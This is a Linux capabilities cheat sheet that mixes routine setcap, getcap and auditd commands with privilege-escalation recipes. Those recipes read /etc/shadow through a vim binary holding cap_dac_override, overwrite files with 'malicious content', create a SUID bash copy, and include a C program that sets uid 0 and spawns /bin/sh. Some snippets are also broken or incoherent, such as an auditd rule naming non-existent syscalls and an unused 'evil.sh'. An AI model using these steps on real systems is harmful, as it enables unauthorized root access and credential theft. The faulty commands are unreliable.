# Capabilities

## Find Binaries With Capabilities

```sh
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

## Set cap_net_bind_service (Bind to Privileged Ports)

```sh
sudo setcap cap_net_bind_service=+ep /usr/bin/my_program
```

## Clear Capabilities

```sh
sudo setcap -r /usr/bin/my_program
```

## List Capabilities of a File

```sh
getcap /usr/bin/my_program
```

## Using cap_dac_override to Read Restricted Files

```sh
/usr/bin/vim.basic /etc/shadow
```

## Using cap_dac_override to Overwrite a File

```bash
echo "evil code" > /tmp/evil.sh
chmod +x /tmp/evil.sh
echo -e ':%s/original content/malicious content/\nwq!' \
  | /usr/bin/vim.basic -es /path/to/important/file
```

## Overwriting an SUID Binary

```bash
cp /bin/bash /tmp/suid_bash
chmod u+s /tmp/suid_bash
echo -e ':%s/original content/malicious content/\nwq!' \
  | /usr/bin/vim.basic -es /tmp/suid_bash
```

## Using cap_setuid (C Program Required)

**setuid.c**

```c
#include <unistd.h>
#include <sys/capability.h>

int main() {
    cap_value_t cap_list[1] = { CAP_SETUID };
    cap_t caps = cap_get_proc();
    cap_set_flag(caps, CAP_EFFECTIVE, 1, cap_list, CAP_SET);
    cap_set_proc(caps);
    cap_free(caps);
    setuid(0);
    execl("/bin/sh", "/bin/sh", NULL);
    return 0;
}
```

Compile and run:

```bash
gcc setuid.c -o setuid -lcap
sudo setcap cap_setuid+ep ./setuid
./setuid
```

## Using cap_sys_admin to Mount a Filesystem

```bash
mkdir /tmp/mnt
dd if=/dev/zero of=/tmp/loopback.img bs=1M count=10
mkfs.ext4 /tmp/loopback.img
sudo setcap cap_sys_admin+ep /bin/mount
mount /tmp/loopback.img /tmp/mnt -o loop
sudo setcap cap_sys_admin+ep /bin/umount
umount /tmp/mnt
```

## Logging Capability Usage (auditd)

```bash
sudo apt install auditd
sudo systemctl enable auditd
sudo systemctl start auditd
sudo auditctl -a always,exit -F arch=b64 -S capset,setcap,getcap -k capabilities
```

View logs:

```bash
sudo ausearch -k capabilities -ts recent
```

## Capability Status of Current Process

```bash
cat /proc/self/status | grep CapBnd
cat /proc/self/status | grep Cap
```

## Check Capabilities of Running Process

```bash
sudo cat /proc/$(pidof processname)/status | grep Cap
```

---

## Concepts

* Capabilities provide fine-grained privilege control.
* Dangerous capabilities:
  * `cap_dac_override` (bypasses file permissions)
  * `cap_setuid`
  * `cap_setgid`
  * `cap_sys_admin`
* `setcap` assigns capabilities to executables.
* Capability sets: permitted, effective, inheritable, bounding.
